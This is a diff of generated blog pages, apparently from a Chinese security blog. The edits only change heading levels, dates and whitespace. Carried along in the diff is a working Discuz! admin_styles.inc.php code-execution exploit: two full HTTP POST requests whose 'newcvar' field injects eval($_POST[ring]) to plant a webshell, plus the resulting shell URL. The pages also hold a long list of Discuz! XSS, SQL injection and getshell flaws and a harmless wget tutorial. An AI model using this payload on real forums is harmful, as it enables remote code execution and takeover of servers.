@@ -181,7 +181,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:30:04" itemprop="dateModified" datetime="2019-07-25T14:30:04+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:09:19" itemprop="dateModified" datetime="2020-06-09T10:09:19+08:00">2020-06-09</time>
               </span>
 
           
@@ -197,9 +197,9 @@
       
           <a id="more"></a>
 
-<h1 id="Discuz-admin-styles-inc-php-get-webshell-bug"><a href="#Discuz-admin-styles-inc-php-get-webshell-bug" class="headerlink" title="Discuz! admin_styles.inc.php get-webshell bug"></a>Discuz! admin_styles.inc.php get-webshell bug</h1><pre><code>author: ring04h
+<h2 id="Discuz-admin-styles-inc-php-get-webshell-bug"><a href="#Discuz-admin-styles-inc-php-get-webshell-bug" class="headerlink" title="Discuz! admin_styles.inc.php get-webshell bug"></a>Discuz! admin_styles.inc.php get-webshell bug</h2><pre><code>author: ring04h
 team:http://www.80vul.com</code></pre><p>由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞.</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在文件admin\styles.inc.php里代码:</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在文件admin\styles.inc.php里代码:</p>
 <pre><code>if($newcvar &amp;&amp; $newcsubst) {
     if($db-&gt;result_first(&quot;SELECT COUNT(*) FROM {$tablepre}stylevars WHERE variable=&apos;$newcvar&apos; AND styleid=&apos;$id&apos;&quot;)) {
         cpmsg(&apos;styles_edit_variable_duplicate&apos;, &apos;&apos;, &apos;error&apos;);
@@ -214,7 +214,7 @@ team:http://www.80vul.com</code></pre><p>由于Discuz!的admin\styles.inc.php里
 ___FCKpd___0
 
 POST[RING]);// &lt;/strong&gt;</code></pre><p>替换出插入 exp by ring04h!，远程写入webshell执行代码.</p>
-<h1 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h1><p>step1：</p>
+<h2 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h2><p>step1：</p>
 <pre><code>POST /bbs/admincp.php?action=styles HTTP/1.1
 Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
 Referer: http://www.80vul.com/bbs/admincp.php?action=styles
@@ -226,7 +226,7 @@ Host: www.80vul.com
 Content-Length: 154
 Connection: Keep-Alive
 Cache-Control: no-cache
-Cookie: 
+Cookie:
 
 formhash=99238f2d&amp;anchor=&amp;updatecsscache=0&amp;namenew%5B1%5D=%C4%AC%C8%CF%B7%E7%B8%F1&amp;availablenew%5B1%5D=1&amp;defaultnew=1&amp;newname=exp&amp;stylesubmit=%CC%E1%BD%BB</code></pre><p>step2:</p>
 <pre><code>POST /bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6 HTTP/1.1
@@ -240,10 +240,10 @@ Host: www.80vul.com
 Content-Length: 1402
 Connection: Keep-Alive
 Cache-Control: no-cache
-Cookie: 
+Cookie:
 
 formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5B249%5D=1&amp;stylevar%5B247%5D=&amp;stylevar%5B248%5D=&amp;stylevar%5B246%5D=&amp;stylevar%5B250%5D=&amp;stylevarbgimg%5B250%5D=&amp;stylevarbgextra%5B250%5D=&amp;stylevar%5B251%5D=&amp;stylevarbgimg%5B251%5D=&amp;stylevarbgextra%5B251%5D=&amp;stylevar%5B252%5D=&amp;stylevarbgimg%5B252%5D=&amp;stylevarbgextra%5B252%5D=&amp;stylevar%5B253%5D=&amp;stylevar%5B254%5D=&amp;stylevar%5B255%5D=&amp;stylevar%5B256%5D=&amp;stylevar%5B257%5D=&amp;stylevar%5B258%5D=&amp;stylevar%5B259%5D=&amp;stylevar%5B260%5D=&amp;stylevar%5B261%5D=&amp;stylevar%5B262%5D=&amp;stylevar%5B263%5D=&amp;stylevar%5B264%5D=&amp;stylevar%5B265%5D=&amp;stylevar%5B266%5D=&amp;stylevar%5B267%5D=&amp;stylevar%5B268%5D=&amp;stylevar%5B269%5D=&amp;stylevar%5B270%5D=&amp;stylevar%5B271%5D=&amp;stylevar%5B272%5D=&amp;stylevar%5B273%5D=&amp;stylevar%5B274%5D=&amp;stylevar%5B275%5D=&amp;stylevarbgimg%5B275%5D=&amp;stylevarbgextra%5B275%5D=&amp;stylevar%5B276%5D=&amp;stylevar%5B277%5D=&amp;stylevar%5B278%5D=&amp;stylevar%5B279%5D=&amp;stylevar%5B280%5D=&amp;stylevar%5B281%5D=&amp;stylevar%5B282%5D=&amp;stylevar%5B283%5D=&amp;stylevarbgimg%5B283%5D=&amp;stylevarbgextra%5B283%5D=&amp;stylevar%5B284%5D=&amp;stylevarbgimg%5B284%5D=&amp;stylevarbgextra%5B284%5D=&amp;stylevar%5B285%5D=&amp;stylevarbgimg%5B285%5D=&amp;stylevarbgextra%5B285%5D=&amp;stylevar%5B286%5D=&amp;stylevar%5B287%5D=&amp;stylevar%5B288%5D=&amp;stylevar%5B289%5D=&amp;stylevar%5B290%5D=&amp;stylevar%5B291%5D=&amp;newcvar=%21%27%2C%2780vul%27%29%3Beval%28%24_post%5Bring%5D%29%3B%2F%2F&amp;newcsubst=exp+by+ring04h%21&amp;editsubmit=%CC%E1%BD%BB</code></pre><p>webshell:</p>
-<pre><code>http://www.80vul.com/bbs/forumdata/cache/style_6.php </code></pre>
+<pre><code>http://www.80vul.com/bbs/forumdata/cache/style_6.php</code></pre>
       
     </div>
 
@@ -388,7 +388,7 @@ formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:29:49" itemprop="dateModified" datetime="2019-07-25T14:29:49+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:09:25" itemprop="dateModified" datetime="2020-06-09T10:09:25+08:00">2020-06-09</time>
               </span>
 
           
@@ -404,43 +404,43 @@ formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5
       
           <a id="more"></a>
 
-<h1 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h1><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞. 
+<h2 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h2><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞.
 
-Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞. 
+Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞.
 
-Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip  
+Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip
 
-Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.   
+Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.
 
-Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.   
+Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.
 
-Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.   
+Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.
 
-Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.     
+Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.
 
-Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.  
+Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.
 
-Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.  
+Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.
 
-Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.  
+Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.
 
-Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug     
+Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug
 
-Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug     
+Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug
 
-Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.    
+Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.
 
-Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.    
+Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.
 
-Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.     
+Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.
 
-Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.    
+Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.
 
-Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.     
+Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.
 
-Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.     
+Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.
 
-Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.   
+Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.
 
 Discuz 6.x—7.x:WAP高危漏洞,wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题
 
@@ -452,9 +452,9 @@ Discuz 7.2:SQL注入漏洞/manyou/sources/notice.php
 
 Discuz 7.2代码执行漏洞
 
-Discuz! x1-1.5 SQL 注入 GetShell EXP 
+Discuz! x1-1.5 SQL 注入 GetShell EXP
 
-Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞 
+Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞
 
 Discuz! 1.5 跨站脚本攻击漏洞 UC登陆页面存在跨站漏洞
 
@@ -589,7 +589,7 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:26:17" itemprop="dateModified" datetime="2019-07-25T14:26:17+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:07:50" itemprop="dateModified" datetime="2020-06-09T10:07:50+08:00">2020-06-09</time>
               </span>
 
           
@@ -603,7 +603,7 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h1><p>需要下载某个目录下面的所有文件。命令如下</p>
+          <h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>需要下载某个目录下面的所有文件。命令如下</p>
 <pre><code>wget -c -r -np -k -L -p www.xxx.org/pub/path/</code></pre><p>在下载时。有用到外部域名的图片或连接。如果需要同时下载就要用-H参数。</p>
 <pre><code>wget -np -nH -r --span-hosts www.xxx.org/pub/path/
 
@@ -613,7 +613,7 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
 -np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/
 没有加参数-np，就会同时下载path的上一级目录pub下的其它文件
 -k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数
--L 递归时不进入其它主机，如wget -c -r www.xxx.org/ </code></pre><p>如果网站内有一个这样的链接：<br><a href="http://www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站" target="_blank" rel="noopener">www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</a></p>
+-L 递归时不进入其它主机，如wget -c -r www.xxx.org/</code></pre><p>如果网站内有一个这样的链接：<br><a href="http://www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站" target="_blank" rel="noopener">www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</a></p>
 <pre><code>-p 下载网页所需的所有文件，如图片等
 -A 指定要下载的文件样式列表，多个样式用逗号分隔
 -i 后面跟一个文件，文件内指明要下载的URL</code></pre><p>还有其他的用法，我从网上搜索的，也一并写上来，方便以后自己使用。</p>
